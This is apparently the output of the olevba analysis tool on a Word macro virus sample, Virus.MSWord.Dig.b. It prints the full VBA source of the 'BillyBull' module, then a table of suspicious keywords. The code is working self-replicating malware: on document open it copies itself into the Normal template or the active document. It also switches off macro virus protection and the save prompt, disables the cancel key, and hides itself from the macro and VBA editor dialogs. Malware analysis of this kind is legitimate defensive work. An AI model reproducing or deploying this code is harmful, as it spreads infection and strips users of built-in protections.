olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Dig.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Dig.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BillyBull.bas 
in file: ./Virus.MSWord.Dig.b - OLE stream: 'Macros/VBA/BillyBull'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 1
Const VStat = 1
'Copyright © 2001 by GremMe&Zergo from dd!Actor.
'All rights reserved.

Sub AutoOpen()
RunMeAldays

Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean

pth = Environ("temp") & "\~WRD000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents

For i = 1 To dc.Count
    If dc(i).Name = "BillyBull" Then
        NInst = 1
        dc(i).Export pth
    End If
Next i

Set dc = ActiveDocument.VBProject.VBComponents

For i = 1 To dc.Count
    If dc(i).Name = "BillyBull" Then
        AInst = 1
        dc(i).Export pth
    End If
Next i

If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
    dc.VBProject.VBComponents.Import pth
    dc.Save
'    If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
    Kill pth
End If

End Sub

Sub AutoExec()
    RunMeAldays
End Sub

Sub FileSave()
'On Error Resume Next
    AutoOpen
'    RunMeAldays
    Pricol
    ActiveDocument.Save
End Sub

Sub FileSaveAs()
On Error Resume Next
    AutoOpen
'    RunMeAldays
    Pricol
    Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub ToolsOptions()
Dim dc As Object
Dim VirStat As Byte
Dim NorStat As Byte

On Error Resume Next

Options.SaveNormalPrompt = NStat
Options.VirusProtection = VStat
Dialogs(wdDialogToolsOptions).Show

Set dc = ActiveDocument.VBProject.VBComponents("BillyBull").CodeModule
If Options.SaveNormalPrompt = True Then NorStat = 1
If Options.VirusProtection = True Then VirStat = 1

dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat

Options.SaveNormalPrompt = 0
Options.VirusProtection = 0

NormalTemplate.Save
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
Dim i As Byte, n As Integer, pth As String
Dim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean
Dim dc As Object, dcN As Object, dcA As Object

MsgBox ("toolmacro")
On Error Resume Next

pth = Environ("temp") & "\~WRD000^.tmp"

Set dcN = NormalTemplate.VBProject.VBComponents
Set dcA = ActiveDocument.VBProject.VBComponents

Set dc = NormalTemplate.VBProject
GoSub 10
NInst = res

Set dc = ActiveDocument.VBProject
GoSub 10
AInst = res

If NInst = True Then
    Set dc = dcN
    GoSub 20
    Nsav = NormalTemplate.Saved
    NormalTemplate.Saved = 1
End If

If AInst = True Then
    Set dc = dcA
    GoSub 20
    Asav = ActiveDocument.Saved
    ActiveDocument.Saved = 1
End If

Dialogs(wdDialogToolsMacro).Show

dcN("BillyBull").CodeModule.AddFromFile pth
dcA("BillyBull").CodeModule.AddFromFile pth
dcN.CodeModule.AddFromFile pth

NormalTemplate.Saved = Nsav
dcA.CodeModule.AddFromFile pth

ActiveDocument.Saved = Asav
Kill pth
Exit Sub

10:
For i = 1 To dc.VBComponents.Count
    If dc.VBComponents(i).Name = "BillyBull" Then
        res = 1
        dc.VBComponents(i).Export pth
    End If
Next i
Return

20:
dc.Export pth
n = dc("BillyBull").CodeModule.CountOfLines
dc("BillyBull").CodeModule.DeleteLines 1, n
Return

End Sub
Sub ViewVBCode()
Dim i As Byte, j As Byte
Dim n As Integer, pth As String
Dim dc As Object, dcN As Object, dcA As Object
'If Dir("c:\autoexec.bat") <> "" Then
'    If FileLen("c:\autoexec.bat") <> 777 Then
'        RunMeAldays
'        Pricol
'        Exit Sub
'        Else
'Dialogs(wdDialogToolsMacro).Show
Set dc = NormalTemplate.VBProject
'        Application.VBE.MainWindow.Visible = False
        Application.VBE.MainWindow.Visible = True
'NormalTemplate.VBProject.VBComponents.Import ("C:\module1.")
'NormalTemplate.VBProject.VBComponents.Item(2).Export ("qqq")
'NormalTemplate.VBProject.VBComponents.Remove (NormalTemplate.VBProject.VBComponents.Item(2))

For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(i).Name = "BillyBull1" Then
        Set dc = NormalTemplate.VBProject.VBComponents.Item(i)
        n = dc.CodeModule.CountOfLines
        dc.CodeModule.DeleteLines 1, n
        NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.InsertLines(1, "wwww") = "qq"
'        NormalTemplate.VBProject.VBComponents.Remove
'        NormalTemplate.VBProject.VBComponents.Remove (NormalTemplate.VBProject.VBComponents.Item(i))
    End If
Next i

NormalTemplate.Saved = 1
'Set dc = NormalTemplate.VBProject.VBComponents("BillyBull").CodeModule

'For i = 1 To dc.VBComponents.Count
'    If dc.VBComponents(i).Name = "BillyBull" Then
'        For j = 1 To Application.VBE.Windows.Count
'            Application.VBE.Windows(1).Visible = False
''            Application.VBE.Windows(j).Visible = False
'        Next j
''        NormalTemplate.VBProject.VBComponents(i).VBE.Windows.
'    End If
'Next i
'            Application.VBE.MainWindow.Visible = True
'    End If
'End If
End Sub
Sub RunMeAldays()
    Application.EnableCancelKey = wdCancelDisabled
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
    Application.VBE.MainWindow.Visible = False
End Sub

Sub Pricol()
'    ActiveDocument.PageSetup.LeftMargin = InchesToPoints(2.5)
'    ActiveDocument.PageSetup.RightMargin = InchesToPoints(2.5)
'    ActiveDocument.PageSetup.BottomMargin = InchesToPoints(2.5)
'    ActiveDocument.PageSetup.TopMargin = InchesToPoints(2.5)
'
'    ActiveDocument.UndoClear
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

